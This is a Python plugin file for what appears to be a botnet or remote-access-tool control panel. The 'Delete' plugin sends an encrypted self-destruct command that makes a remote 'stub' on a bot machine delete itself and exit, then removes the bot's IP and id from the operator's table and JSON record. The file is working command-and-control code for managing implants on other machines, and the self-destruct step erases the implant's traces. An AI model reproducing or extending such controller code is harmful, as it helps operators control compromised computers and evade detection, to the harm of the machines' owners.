# plugins/delete.py
from PyQt6.QtWidgets import QMessageBox
from .base_plugin import BasePlugin
import ujson as json
import os

# Plugin metadata for loader
plugin_info = {
    'name': 'Delete',
    'priority': 200,
    'handled_types': []
}


class DeletePlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Delete"
        # Delete requests the remote stub to remove itself and exit.
        self.menu_action = self.name
        self.category = "Bot"
        self.priority = 200

    def execute(self, target):
        if target == 'all':
            QMessageBox.warning(self.parent, 'Warning', 'Cannot delete all bots at once. Please select a specific bot.')
            return

        # Confirm deletion non-blocking
        msg = QMessageBox(self.parent)
        msg.setWindowTitle('Confirm Deletion')
        msg.setText(f'Are you sure you want to remove the bot {target} from connections list?')
        msg.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg.finished.connect(lambda res, t=target: self._on_delete_confirm(res, t))
        msg.show()
        return

    def _on_delete_confirm(self, res, target):
        try:
            if res != QMessageBox.StandardButton.Yes:
                return
            # proceed with deletion: ask server to self-destruct, then remove locally
            ip, bot_id = target.split(':')
            # Tell the bot to perform delete (stub will schedule self-delete and exit)
            command = {'type': 'command', 'target': target, 'action': 'delete'}
            try:
                self.parent.transport.send_command(command, encrypt=True)
                self.parent.log_buffered(f"Sent self-destruct command: {command}")
            except Exception as e:
                self.parent.log_buffered(f"Failed to send delete command: {e}")

            # Remove from device model/table
            self.parent.remove_device_from_table(ip, bot_id)

            # Update the JSON file (remove the bot entry)
            try:
                if os.path.exists(self.parent.json_file):
                    with open(self.parent.json_file, 'r') as f:
                        bots = json.load(f)
                    bots = [bot for bot in bots if bot['id'] != bot_id or bot['ip'] != ip]
                    with open(self.parent.json_file, 'w') as f:
                        json.dump(bots, f, indent=4)
                    self.parent.log_buffered(f"Removed bot {target} from JSON")
                else:
                    self.parent.log_buffered("No connected bots JSON file found")
            except Exception as e:
                self.parent.log_buffered(f"Error deleting bot from JSON: {e}")
        except Exception as e:
            self.parent.log_buffered(f"Error in delete confirmation handler: {e}")

        # No further duplicate actions